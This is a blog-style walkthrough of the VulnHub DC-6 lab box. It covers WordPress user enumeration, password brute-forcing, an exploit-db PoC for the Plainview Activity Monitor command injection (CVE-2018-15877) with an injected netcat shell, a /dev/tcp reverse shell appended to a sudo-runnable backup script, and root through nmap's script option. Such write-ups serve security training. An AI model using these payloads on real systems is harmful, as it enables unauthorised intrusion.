<h4 id="nmap-nse">Nmap NSE</h4>
<p><code>nmap</code> script scan found some usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -p <span class="m">80</span> --script <span class="s2">&#34;http-wordpress*&#34;</span> wordy
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-11 23:13 EDT
Nmap scan report <span class="k">for</span> wordy <span class="o">(</span>192.168.2.104<span class="o">)</span>
Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span>.

PORT   STATE SERVICE
80/tcp open  http
...
<span class="p">|</span>   /: WordPress version: 5.1.1
...
<span class="p">|</span> http-wordpress-users: 
<span class="p">|</span> Username found: admin
<span class="p">|</span> Username found: graham
<span class="p">|</span> Username found: mark
<span class="p">|</span> Username found: sarah
<span class="p">|</span> Username found: jens
<span class="p">|</span>_Search stopped at ID <span class="c1">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.48 seconds
</code></pre></div><h4 id="wpscan">WPScan</h4>
<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
...
<span class="o">[</span>+<span class="o">]</span> plainview-activity-monitor
 <span class="p">|</span> Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 <span class="p">|</span> Last Updated: 2018-08-26T15:08:00.000Z
 <span class="p">|</span> Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is <span class="m">20180826</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Directory listing is enabled
 <span class="p">|</span>
 <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span class="m">200</span>
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: Plainview Activity Monitor &lt;<span class="o">=</span> <span class="m">20161228</span> - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span>
 <span class="p">|</span>     Fixed in: <span class="m">20180826</span>
 <span class="p">|</span>     References:
 <span class="p">|</span>      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
 <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2018-15877
 <span class="p">|</span>      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
 <span class="p">|</span>      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
 <span class="p">|</span>
 <span class="p">|</span> Version: <span class="m">20161228</span> <span class="o">(</span>50% confidence<span class="o">)</span>
 <span class="p">|</span> Found By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

<span class="o">[</span>+<span class="o">]</span> user-role-editor
 <span class="p">|</span> Location: http://wordy/wp-content/plugins/user-role-editor/
 <span class="p">|</span> Last Updated: 2021-04-05T02:38:00.000Z
 <span class="p">|</span> Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 4.59
 <span class="p">|</span>
 <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/, status: <span class="m">200</span>
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: User Role Editor &lt;<span class="o">=</span> 4.24 - Privilege Escalation
 <span class="p">|</span>     Fixed in: 4.25
 <span class="p">|</span>     References:
 <span class="p">|</span>      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
 <span class="p">|</span>      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
 <span class="p">|</span>
 <span class="p">|</span> Version: 4.24 <span class="o">(</span>80% confidence<span class="o">)</span>
 <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
...
</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  /></div>
</p>
<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ cat /usr/share/wordlists/rockyou.txt <span class="p">|</span> grep k01 &gt; passwords.txt
→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="wp-dashboard">WP Dashboard</h4>
<p>With the credentials I obtained, I can login into the admin panel.</p>
<p><div class="img-container"><img src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  /></div>
</p>
<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
  <span class="c">&lt;!--  Wordpress Plainview Activity Monitor RCE
</span><span class="c">        [+] Version: 20161228 and possibly prior
</span><span class="c">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
</span><span class="c">        [+] Author: LydA(c)ric LEFEBVRE
</span><span class="c">        [+] CVE-ID: CVE-2018-15877
</span><span class="c">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
</span><span class="c">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
</span><span class="c">  --&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;ip&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;lookup&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Lookup&#34;</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
<p><div class="img-container"><img src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  /></div>
</p>
<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
<p>Here is with command pipe.</p>
<p><div class="img-container"><img src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  /></div>
</p>
<p>And this one by stacking commands with semicolon.</p>
<p><div class="img-container"><img src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  /></div>
</p>
<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">...</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]</span>
<span class="nv">$do_something</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;dig </span><span class="si">$ip</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="o">...</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-graham">Shell as graham</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>The home directory is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
find /home 2&gt;/dev/null
...
/home/jens/backups.sh
....
/home/mark/stuff/things-to-do.txt
....
</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
ls -l /home/jens/backups.sh
-rwxrwxr-x <span class="m">1</span> jens devs <span class="m">50</span> Apr <span class="m">26</span>  <span class="m">2019</span> /home/jens/backups.sh
www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
cat /home/jens/backups.sh
<span class="c1">#!/bin/bash</span>
tar -czf backups.tar.gz /var/www/html
</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement
</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
$ ssh graham@192.168.2.104
graham@192.168.2.104&#39;s password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ ls -l /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">graham@dc-6:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  /></div>
</p>
<h3 id="shell-as--root">Shell as  root</h3>
<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> jens on dc-6:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jens may run the following commands on dc-6:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
jens@dc-6:/home/graham$ <span class="nb">echo</span> <span class="s1">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; <span class="nv">$TF</span>
jens@dc-6:/home/graham$ sudo nmap --script<span class="o">=</span><span class="nv">$TF</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  /></div>
</p>
<p>And here is the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 


Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
